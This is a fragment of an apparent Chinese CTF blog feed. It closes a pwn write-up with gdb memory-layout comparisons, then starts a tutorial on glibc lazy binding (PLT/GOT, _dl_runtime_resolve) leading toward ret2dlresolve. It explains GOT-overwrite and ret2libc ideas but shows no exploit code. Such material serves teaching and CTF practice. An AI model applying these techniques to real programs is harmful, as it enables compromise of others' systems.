root        20  0.0  0.0  13784  2392 ?        Ss   00:16   0:00 /usr/sbin/xinetd <span class="nt">-pidfile</span> /run/xinetd.pid <span class="nt">-stayalive</span> <span class="nt">-inetd_c</span>
root        21  0.0  0.0   4628  3720 pts/0    Ss   00:16   0:00 /bin/bash
root        29  0.0  0.0   2652   264 ?        Ss   00:17   0:00 ./attachment <span class="c"># &lt;--- 在这里</span>
root        30  0.0  0.0   7064  1552 pts/0    R+   00:17   0:00 ps aux
</code></pre></div></div> <h5 id="现在调试这个pid">   现在调试这个pid</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;容器名&gt;/home/ctf<span class="nv">$ </span>gdb <span class="nt">--pi</span><span class="o">=</span>29
<span class="o">(</span>gdb<span class="o">)</span> x/10gx 0x56341ccb5000 + 0x40a0
0x56341ccb90a0: 0x00007ff9322bc000      0x0000000000000000
0x56341ccb90b0: 0x0000000000000000      0x0000000000000000
0x56341ccb90c0: 0x0000000000000000      0x0000000000000000
0x56341ccb90d0: 0x0000000000000000      0x0000000000000000
0x56341ccb90e0: 0x0000000000000000      0x0000000000000000
</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;容器名&gt;/home/ctf<span class="nv">$ </span><span class="nb">cat</span> /proc/29/maps
56341ccb5000-56341ccb6000 r--p 00000000 08:30 20412                      /home/ctf/attachment
56341ccb6000-56341ccb7000 r-xp 00001000 08:30 20412                      /home/ctf/attachment
56341ccb7000-56341ccb8000 r--p 00002000 08:30 20412                      /home/ctf/attachment
56341ccb8000-56341ccb9000 r--p 00002000 08:30 20412                      /home/ctf/attachment
56341ccb9000-56341ccba000 rw-p 00003000 08:30 20412                      /home/ctf/attachment
7ff9322bc000-7ff9322c1000 rw-p 00000000 00:00 0 <span class="c"># &lt;------- 这里</span>
7ff9322c1000-7ff9322e9000 r--p 00000000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9322e9000-7ff93247e000 r-xp 00028000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff93247e000-7ff9324d6000 r--p 001bd000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9324d6000-7ff9324d7000 <span class="nt">---p</span> 00215000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9324d7000-7ff9324db000 r--p 00215000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9324db000-7ff9324dd000 rw-p 00219000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9324dd000-7ff9324ec000 rw-p 00000000 00:00 0 
7ff9324ec000-7ff9324ee000 r--p 00000000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ff9324ee000-7ff932518000 r-xp 00002000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ff932518000-7ff932523000 r--p 0002c000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ff932524000-7ff932526000 r--p 00037000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ff932526000-7ff932528000 rw-p 00039000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffdbc5a8000-7ffdbc5c9000 rw-p 00000000 00:00 0                          <span class="o">[</span>stack]
7ffdbc5ec000-7ffdbc5f0000 r--p 00000000 00:00 0                          <span class="o">[</span>vvar]
7ffdbc5f0000-7ffdbc5f2000 r-xp 00000000 00:00 0                          <span class="o">[</span>vdso]
</code></pre></div></div> <h5 id="结果发现这个xinted转发的进程的内存布局和patchelf的似乎一致mmap的位置都在libc上面其他长度也是对应的这个结果就有点子幽默了本来就是patchelf无法得到完全一致的内存布局所以给了dockerfile结果现在xinted转发的进程内存布局不一样反倒和patchelf的结果正好对上了">   结果发现这个xinted转发的进程的内存布局和patchelf的似乎一致,mmap的位置都在libc上面,其他长度也是对应的.<br/>   这个结果就有点子幽默了,本来就是patchelf无法得到完全一致的内存布局所以给了Dockerfile,结果现在xinted转发的进程内存布局不一样,反倒和patchelf的结果正好对上了😅😅😅</h5> <h3 id="end">END</h3>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><summary type="html"><![CDATA[前情提要]]></summary></entry><entry><title type="html">glibc动态链接重定位 + CNSS2024 pwn boss wp</title><link href="https://leakbox258.github.io/blog/2024/ret2dlresolve/" rel="alternate" type="text/html" title="glibc动态链接重定位 + CNSS2024 pwn boss wp"/><published>2024-10-02T00:00:00+00:00</published><updated>2024-10-02T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/ret2dlresolve</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/ret2dlresolve/"><![CDATA[<h4 id="参考资料">参考资料：</h4> <p>实例文件为boss题的attachment，见github<br/> https://zhuanlan.zhihu.com/p/37572651<br/> https://ctf-wiki.org/executable/elf/structure/basic-info/<br/> https://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/ <br/> https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc <br/></p> <h3 id="动态链接程序的装载">动态链接程序的装载</h3> <h5 id="当程序使用动态链接时才会存在延迟绑定技术一个动态链接的程序除了要将程序本身加载进内存之外还需要加载对应使用的libc这一步由ld动态链接器实现由于动态链接信息与程序的形成和加载由莫大关系所以在linux系统下这些信息必须在二进制文件中明确写出而不是存放在某个path中">   当程序使用动态链接时，才会存在延迟绑定技术。<br/>   一个动态链接的程序，除了要将程序本身加载进内存之外，还需要加载对应使用的libc，这一步由ld动态链接器实现。<br/>   由于动态链接信息与程序的形成和加载由莫大关系，所以在linux系统下，这些信息必须在二进制文件中明确写出，而不是存放在某个PATH中。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>首先，我们来关注一下链接视图。

文件开始处是 ELF 头部（ ELF Header），它给出了整个文件的组织情况。

如果程序头部表（Program Header Table）存在的话，它会告诉系统如何创建进程。用于生成进程的目标文件必须具有程序头部表，但是重定位文件不需要这个表。

节区部分包含在链接视图中要使用的大部分信息：指令、数据、符号表、重定位信息等等。

节区头部表（Section Header Table）包含了描述文件节区的信息，每个节区在表中都有一个表项，会给出节区名称、节区大小等信息。用于链接的目标文件必须有节区头部表，其它目标文件则无所谓，可以有，也可以没有。

</code></pre></div></div> <p><strong><em>来自CTFwiki</em></strong></p> <h5 id="这里谈及的是linking-view链接视图也就是程序没有加载时的结构header-table中有关链接的信息在装载时被读取作为构建executing-view执行视图的依据如下ida也读取到了这些信息">   这里谈及的是Linking View（链接视图），也就是程序没有加载时的结构，Header table中有关链接的信息在装载时被读取，作为构建Executing View（执行视图）的依据。如下，IDA也读取到了这些信息。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000000000
LOAD:0000000000000000 <span class="p">;</span> File Name   : C:<span class="se">\U</span>sers<span class="se">\3</span>0336<span class="se">\D</span>esktop<span class="se">\p</span>wn
LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>
</code></pre></div></div> <h5 id="不难发现即使是在桌面中的文件ida依然可以正确读取interpreter的位置因为这些信息已经写死在二进制文件中常用的工具patchelf也是通过直接修改文件达成interpreter和libc的更换">   不难发现，即使是在桌面中的文件，IDA依然可以正确读取Interpreter的位置，因为这些信息已经写死在二进制文件中。<br/>   常用的工具<code class="language-plaintext highlighter-rouge">patchelf</code>也是通过直接修改文件达成Interpreter和libc的更换。</h5> <h3 id="延迟绑定系统">延迟绑定系统</h3> <h5 id="对于动态链接库的使用主要关注点在于外部函数的使用当程序和库被装载在内存之后text段的指令就可以通过call来实现对外部函数的调用对于内部的函数call指令相当于是push和jmp然后到达对应地址之后开始压栈执行等而call外部函数时对应地址是另外一条jmp它会跳转到该函数的plt的位置如果这个外部函数已经被调用过至少一次那么plt处第二次跳转会到达该函数的got表项的位置这个got表项又是另一个jmp指令这次终于到达了外部函数的真正地址然后开始压栈执行这是外部函数大多数情况下的调用过程">   对于动态链接库的使用，主要关注点在于外部函数的使用<br/>   当程序和库被装载在内存之后，.text段的指令就可以通过<code class="language-plaintext highlighter-rouge">call</code>来实现对外部函数的调用，对于内部的函数<code class="language-plaintext highlighter-rouge">call</code>指令相当于是<code class="language-plaintext highlighter-rouge">push</code>和<code class="language-plaintext highlighter-rouge">jmp</code>，然后到达对应地址之后开始压栈、执行等。而<code class="language-plaintext highlighter-rouge">call</code>外部函数时，对应地址是另外一条<code class="language-plaintext highlighter-rouge">jmp</code>，它会跳转到该函数的<code class="language-plaintext highlighter-rouge">plt</code>的位置。<br/>   如果这个外部函数已经被调用过至少一次，那么<code class="language-plaintext highlighter-rouge">plt</code>处第二次跳转会到达该函数的<code class="language-plaintext highlighter-rouge">got</code>表项的位置，这个<code class="language-plaintext highlighter-rouge">got</code>表项又是另一个<code class="language-plaintext highlighter-rouge">jmp</code>指令，这次终于到达了外部函数的真正地址，然后开始压栈、执行。这是外部函数大多数情况下的调用过程。<br/></h5> <h5 id="众所周知我们在打ret2libc时需要先泄露出libc中某一个函数在内存中的真实地址然后根据已知的偏移找到我们需要的东西即使是-no-pie也是一样所以说由于种种原因即使程序本身的地址可以通过静态分析获得确切地址也无法预先找到libc的加载地址那么问题来了由于text肯定是没法跟着libc加载地址一起变化的那么在使用外部函数时怎样才能保证外部函数地址的正确呢这就是第一次调用外部函数时需要解决的也就是对外部函数进行重定位-">   众所周知，我们在打<code class="language-plaintext highlighter-rouge">ret2libc</code>时，需要先泄露出libc中某一个函数在内存中的真实地址，然后根据已知的偏移找到我们需要的东西，即使是<code class="language-plaintext highlighter-rouge">-no-pie</code>也是一样。所以说由于种种原因，即使程序本身的地址可以通过静态分析获得确切地址，也无法预先找到libc的加载地址。<br/>   那么问题来了，由于<code class="language-plaintext highlighter-rouge">.text</code>肯定是没法跟着libc加载地址一起变化的，那么在使用外部函数时，怎样才能保证外部函数地址的正确呢？这就是第一次调用外部函数时需要解决的，也就是对外部函数进行重定位. <br/></h5> <h5 id="首先解决一个疑惑为什么是在第一次调用时才重定位呢实际上不一定是第一次调用才重定位也可能在main之前就被处理好了但在具体实现尤其是有大量外部函数的调用时上还是第一次调用时重定位居多很简单因为重定位是一个比较消耗时间的过程而有些函数比如异常时结束进程的exit很可能根本就用不上所以就延迟绑定lazy-load没ddl绝不干活">   首先解决一个疑惑，为什么是在第一次调用时才重定位呢？实际上，不一定是第一次调用才重定位，也可能在<code class="language-plaintext highlighter-rouge">main()</code>之前就被处理好了，但在具体实现（尤其是有大量外部函数的调用时）上，还是第一次调用时重定位居多。很简单，因为重定位是一个比较消耗时间的过程，而有些函数（比如异常时结束进程的<code class="language-plaintext highlighter-rouge">exit()</code>）很可能根本就用不上，所以就延迟绑定（lazy load），没ddl绝不干活。<br/></h5> <h5 id="由于延迟绑定的存在所以之前所说的got表那一内存页在完成所有重定位之前一直都要保持可写这就是got表篡改这一漏洞的实现逻辑既在所有重定位完成之前篡改一个或多个got表项这个办法在partial-relro和no-relro时可用在full-relro时函数被提前重定位然后内存页变成只读就没办法改了">   由于延迟绑定的存在，所以之前所说的<code class="language-plaintext highlighter-rouge">got</code>表那一内存页在完成所有重定位之前，一直都要保持可写。这就是<code class="language-plaintext highlighter-rouge">got</code>表篡改这一漏洞的实现逻辑，既在所有重定位完成之前篡改一个或多个<code class="language-plaintext highlighter-rouge">got</code>表项。这个办法在<code class="language-plaintext highlighter-rouge">partial RELRO</code>和<code class="language-plaintext highlighter-rouge">no RELRO</code>时可用，在<code class="language-plaintext highlighter-rouge">full RELRO</code>时，函数被提前重定位，然后内存页变成只读，就没办法改了。<br/></h5> <h3 id="延迟绑定-detail">延迟绑定 detail</h3> <h5 id="先来一个一个demo这个是最原始纯真的延迟绑定后面会来一个带-fcf-protectionnone的demo">   先来一个一个demo，这个是最原始纯真的延迟绑定，后面会来一个带<code class="language-plaintext highlighter-rouge">-fcf-protection=none</code>的demo。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="s">"what a day!"</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">gcc</span> <span class="n">lazy_load</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">z</span> <span class="n">lazy</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span> <span class="o">-</span><span class="n">fcf</span><span class="o">-</span><span class="n">protection</span><span class="o">=</span><span class="n">none</span> <span class="o">-</span><span class="n">o</span> <span class="n">lazy_load</span>
</code></pre></div></div> <h5 id="-在main中第一次调用puts可以看到是putsplt">    在<code class="language-plaintext highlighter-rouge">main()</code>中第一次调用<code class="language-plaintext highlighter-rouge">puts()</code>，可以看到是<code class="language-plaintext highlighter-rouge">puts@plt</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">►</span> <span class="mh">0x401140</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>    <span class="n">call</span>   <span class="n">puts</span><span class="err">@</span><span class="n">plt</span>                    <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div></div> <h5 id="-然后进去看看">    然后进去看看</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x401030</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span> <span class="n">jmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404018</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x401036</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>       <span class="n">push</span>   <span class="mh">0x0</span>
   <span class="mh">0x40103b</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>      <span class="n">jmp</span>    <span class="mh">0x401020</span>
</code></pre></div></div> <h5 id="-再到putsgotplt看一眼这一块有些不知所云网上收集的资料倒是比较容易一致的说法是这里是存放的是putsplt--6的指令也就是又跳转回去到了下面的0x401036的位置">    再到<code class="language-plaintext highlighter-rouge">puts@got.plt</code>看一眼，这一块有些不知所云，网上收集的资料倒是比较容易，一致的说法是，这里是存放的是<code class="language-plaintext highlighter-rouge">puts@plt + 6</code>的指令，也就是又跳转回去，到了下面的<code class="language-plaintext highlighter-rouge">0x401036</code>的位置。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mh">0x404018</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;:</span>     <span class="n">ss</span> <span class="n">adc</span> <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x0</span><span class="p">],</span><span class="n">al</span>
   <span class="mh">0x40401c</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span><span class="n">al</span>
   <span class="mh">0x40401e</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span><span class="n">al</span>
</code></pre></div></div> <h5 id="再回来6位置push一个0x0到栈上然后又跳">   再回来，<code class="language-plaintext highlighter-rouge">+6</code>位置<code class="language-plaintext highlighter-rouge">push</code>一个<code class="language-plaintext highlighter-rouge">0x0</code>到栈上，然后又跳</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x401036</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>       <span class="n">push</span>   <span class="mh">0x0</span>
   <span class="mh">0x40103b</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>      <span class="n">jmp</span>    <span class="mh">0x401020</span>
</code></pre></div></div> <h5 id="不难看到这块儿正好在putsplt上具体来说是它在plt头部所以也叫plt0又向栈上push然后jmp到0x404010">   不难看到，这块儿正好在<code class="language-plaintext highlighter-rouge">puts@plt</code>上，具体来说是它在plt头部，所以也叫plt[0]<br/>   又向栈上<code class="language-plaintext highlighter-rouge">push</code>，然后<code class="language-plaintext highlighter-rouge">jmp</code>到<code class="language-plaintext highlighter-rouge">0x404010</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x401020</span><span class="o">:</span>    <span class="n">push</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404008</span>
   <span class="mh">0x401026</span><span class="o">:</span>    <span class="n">jmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe4</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404010</span>
   <span class="mh">0x40102c</span><span class="o">:</span>    <span class="n">nop</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
   <span class="mh">0x401030</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span> <span class="n">jmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404018</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div></div> <h5 id="0x404010是一个函数的地址这个函数就是_dl_runtime_resolve用于运行时进行外部函数重定位而刚才的两次push是为该函数提供了参数第一个push的是rel_arg是一个偏移值第二个是link_map结构体">   <code class="language-plaintext highlighter-rouge">0x404010</code>是一个函数的地址，这个函数就是<code class="language-plaintext highlighter-rouge">_dl_runtime_resolve()</code>，用于运行时进行外部函数重定位，而刚才的两次<code class="language-plaintext highlighter-rouge">push</code>，是为该函数提供了参数，第一个<code class="language-plaintext highlighter-rouge">push</code>的是<code class="language-plaintext highlighter-rouge">rel_arg</code>，是一个偏移值，第二个是<code class="language-plaintext highlighter-rouge">link_map</code>结构体。<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x404008</span><span class="o">:</span>       <span class="mh">0x00007ffff7ffe2e0</span>      <span class="mh">0x00007ffff7fd8d30</span> <span class="err">#</span> <span class="n">linkmap</span> <span class="err">#</span> <span class="n">_dl_runtime_resolve</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x00007ffff7fd8d30</span>
<span class="mh">0x7ffff7fd8d30</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">&gt;:</span>    <span class="mh">0xe3894853fa1e0ff3</span>      <span class="mh">0x4d252b48c0e48348</span>
<span class="mh">0x7ffff7fd8d40</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span> <span class="mh">0x482404894800023f</span>      <span class="mh">0x2454894808244c89</span>
<span class="mh">0x7ffff7fd8d50</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span> <span class="mh">0x8948182474894810</span>      <span class="mh">0x282444894c20247c</span>
<span class="mh">0x7ffff7fd8d60</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span> <span class="mh">0x00eeb830244c894c</span>      <span class="mh">0x24948948d2310000</span>
<span class="mh">0x7ffff7fd8d70</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span> <span class="mh">0x2494894800000250</span>      <span class="mh">0x2494894800000258</span>
</code></pre></div></div> <h5 id="需要注意的是无论是32还是64位都是这一套模式64位在这里不会用寄存器传递这两个参数">   需要注意的是，无论是32还是64位都是这一套模式，64位在这里不会用寄存器传递这两个参数。</h5> <h3 id="_dl_runtime_resolve如何重定位">_dl_runtime_resolve()如何重定位</h3> <h5 id="在具体讨论之前补充一些关于segment的东西">   在具体讨论之前，补充一些关于Segment的东西<br/></h5> <h5 id="dynamic存储很多关于动态链接的信息的结构体elf64_dyn结构体内包含的是信息的种类以及地址">   .dynamic，存储很多关于动态链接的信息的结构体（ELF64_Dyn），结构体内包含的是信息的种类以及地址。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">Dynamic</span> <span class="n">Information</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="o">===========================================================================</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="n">Segment</span> <span class="n">type</span><span class="o">:</span> <span class="n">Pure</span> <span class="n">data</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="n">Segment</span> <span class="n">permissions</span><span class="o">:</span> <span class="n">Read</span><span class="o">/</span><span class="n">Write</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="n">LOAD</span>            <span class="n">segment</span> <span class="n">mempage</span> <span class="n">public</span> <span class="err">'</span><span class="n">DATA</span><span class="err">'</span> <span class="n">use64</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                 <span class="n">assume</span> <span class="n">cs</span><span class="o">:</span><span class="n">LOAD</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                 <span class="p">;</span><span class="n">org</span> <span class="mf">403E20</span><span class="n">h</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="n">_DYNAMIC</span>        <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004001</span><span class="n">A0</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                                         <span class="p">;</span> <span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">:</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                                         <span class="p">;</span> <span class="n">DT_NEEDED</span> <span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E30</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Ch</span><span class="p">,</span> <span class="mi">401000</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_INIT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E40</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Dh</span><span class="p">,</span> <span class="mi">40114</span><span class="n">Ch</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_FINI</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E50</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">19</span><span class="n">h</span><span class="p">,</span> <span class="mf">403E10</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_INIT_ARRAY</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E60</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_INIT_ARRAYSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E70</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Ah</span><span class="p">,</span> <span class="mf">403E18</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_FINI_ARRAY</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E80</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Ch</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_FINI_ARRAYSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E90</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFEF5h</span><span class="p">,</span> <span class="mi">4003</span><span class="n">A0h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_GNU_HASH</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EA0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">5</span><span class="p">,</span> <span class="mi">400420</span><span class="n">h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_STRTAB</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EB0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="p">,</span> <span class="mi">4003</span><span class="n">C0h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_SYMTAB</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EC0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Ah</span><span class="p">,</span> <span class="mi">48</span><span class="n">h</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">DT_STRSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">ED0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">DT_SYMENT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EE0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">15</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_DEBUG</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EF0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">3</span><span class="p">,</span> <span class="mi">404000</span><span class="n">h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_PLTGOT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F00</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">2</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_PLTRELSZ</span>
